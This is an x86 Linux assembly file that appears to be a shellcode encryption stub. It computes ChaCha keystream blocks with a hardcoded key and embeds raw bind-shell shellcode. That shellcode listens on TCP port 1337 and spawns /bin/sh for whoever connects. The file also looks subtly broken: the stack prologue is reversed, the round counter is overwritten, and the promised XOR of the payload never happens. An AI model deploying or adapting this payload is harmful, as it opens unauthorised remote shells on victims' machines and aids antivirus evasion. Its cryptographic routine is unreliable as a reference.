global _start

_start:
	jmp short payload

; the chacha quarter round function
; input: four 32-bit integer a, b, c and d
; output: quarterround(a, b, c, d)
qr:
	push ebp
	mov esp, ebp
				; qr(a,b,c,d) where a, b, c and d (dword)

	add eax, ebx		; a + b
	xor edx, eax		; d xor a
	rol edx, 0x10		; d <<< 16

	add ecx, edx		; c + d
	xor ebx, ecx		; b xor c
	rol ebx, 0xc		; b <<< 12
	
	add eax, ebx		; a + b
	xor edx, eax		; d xor a
	rol edx, 0x8		; d <<< 8

	add ecx, edx		; c + d
	xor ebx, ecx		; b xor c
	rol ebx, 0x7		; b <<< 7
	
	leave			
	ret

; computation of a 64-byte block of the stream of Chacha
; input: key, nonce, block counter stored in matrix M
; output: a 64-byte block of the stream
block:	
	pop esi
	push esi
	
	xor ebx, ebx
	xor edx, edx
	
	push ebx 		; nounce1
	push ebx		; nounce0
	push ebx		; counter1
	push edx		; counter0
	
	push 0x44524f57		; key7
	push 0x53534150		; key6
	push 0x474e4f4c		; key5
	push 0x474e4f4c		; key4
	push 0x44524f57		; key3
	push 0x53534150		; key2
	push 0x474e4f4c		; key1
	push 0x474e4f4c		; key0
		         			
	push 0x6b206574		; 0x6b ASCII 'k'; 0x20 ASCII ' '; 0x65 ASCII 'e'; 0x74 ASCII 't'
	push 0x79622d32		; 0x79 ASCII 'y'; 0x62 ASCII 'b'; 0x2d ASCII '-'; 0x32 ASCII '2'
	push 0x3320646e		; 0x33 ASCII '3'; 0x20 ASCII ' '; 0x64 ASCII 'd'; 0x6e ASCII 'n'
	push 0x61707865		; 0x61 ASCII 'a'; 0x70 ASCII 'p'; 0x78 ASCII 'x'; 0x65 ASCII 'e'
	
	mov ecx, 0xa		; 20 rounds
round:
	; odd number
	; first line
	mov eax, [esp]
	mov ebx, [esp+16]
	mov ecx, [esp+32]
	mov edx, [esp+48]
	call qr			; QR(v0,v4,v8,v12)
	
	mov [esp], eax
	mov [esp+16], ebx
	mov [esp+32], ecx
	mov [esp+48], edx

	; second line
	mov eax, [esp+4]
	mov ebx, [esp+20]	
	mov ecx, [esp+36]
	mov edx, [esp+52]
	call qr			; QR(v1,v5,v9,v13)
	
	mov [esp+4], eax
	mov [esp+20], ebx
	mov [esp+36], ecx
	mov [esp+52], edx

	; third line
	mov eax, [esp+8]
	mov ebx, [esp+24]	
	mov ecx, [esp+40]
	mov edx, [esp+56]
	call qr			; QR(v2,v6,v10,v14)
	
	mov [esp+8], eax
	mov [esp+24], ebx
	mov [esp+40], ecx
	mov [esp+56], edx
	
	; fourth line
	mov eax, [esp+12]
	mov ebx, [esp+28]
	mov ecx, [esp+44]
	mov edx, [esp+60]
	call qr			; QR(v3,v7,v11,v15)
	
	mov [esp+12], eax
	mov [esp+28], ebx
	mov [esp+44], ecx
	mov [esp+60], edx
	
	; even number
	; first line
	mov eax, [esp]	
	mov ebx, [esp+20]
	mov ecx, [esp+40]
	mov edx, [esp+60]
	call qr			; QR(v0,v5,v10,v15)

	mov [esp], eax
	mov [esp+20], ebx
	mov [esp+40], ecx
	mov [esp+60], edx

	; second line
	mov eax, [esp+4]
	mov ebx, [esp+24]
	mov ecx, [esp+44]
	mov edx, [esp+48]
	call qr			; QR(v1,v6,v11,v12)

	mov [esp+4], eax
	mov [esp+24], ebx
	mov [esp+44], ecx
	mov [esp+48], edx

	; third line
	mov eax, [esp+8]
	mov ebx, [esp+28]
	mov ecx, [esp+32]
	mov edx, [esp+52]
	call qr			; QR(v2,v7,v8,v13)
	
	mov [esp+8], eax
	mov [esp+28], ebx
	mov [esp+32], ecx
	mov [esp+52], edx
	
	; fourth line
	mov eax, [esp+12]
	mov ebx, [esp+16]
	mov ecx, [esp+36]
	mov edx, [esp+56]
	call qr			; QR(v3,v4,v9,v14)

	mov [esp+12], eax
	mov [esp+16], ebx
	mov [esp+36], ecx
	mov [esp+56], edx
	
	loop round

	jmp payload	
payload:
	call block	
	; bind_tcp (have to XOR)
	; size 0x8e (142)
	shellcode: db 0x31,0xff,0x31,0xd2,0x31,0xdb,0x31,0xc0,0x52,0x6a,0x01,0x6a,0x02,0x89,0xe1,0xb3,0x01,0xb0,0x66,0xcd,0x80,0x31,0xd2,0x52,0x66,0xba,0x05,0x39,0xc1,0xe2,0x10,0xb2,0x02,0x52,0x89,0xe1,0x6a,0x10,0x51,0x50,0x89,0xe1,0xb3,0x02,0xb0,0x66,0xcd,0x80,0x5a,0x57,0x52,0x89,0xe1,0xb3,0x04,0xb0,0x66,0xcd,0x80,0x57,0x57,0x89,0xe1,0x57,0x57,0x52,0x89,0xe1,0xb3,0x05,0xb0,0x66,0xcd,0x80,0x31,0xc9,0xb1,0x02,0x89,0xc3,0x51,0x31,0xc0,0xb0,0x3f,0xcd,0x80,0x59,0x49,0x7d,0xf5,0xeb,0x1c,0x5e,0x31,0xdb,0x8d,0x4e,0x0d,0x89,0x0e,0x89,0x5e,0x04,0x88,0x5e,0x0f,0x8d,0x56,0x04,0x8d,0x0e,0x8d,0x5e,0x08,0x31,0xc0,0xb0,0x0b,0xcd,0x80,0xe8,0xdf,0xff,0xff,0xff,0x5a,0x5a,0x5a,0x5a,0x4e,0x4e,0x4e,0x4e,0x2f,0x62,0x69,0x6e,0x2f,0x73,0x68,0x4e
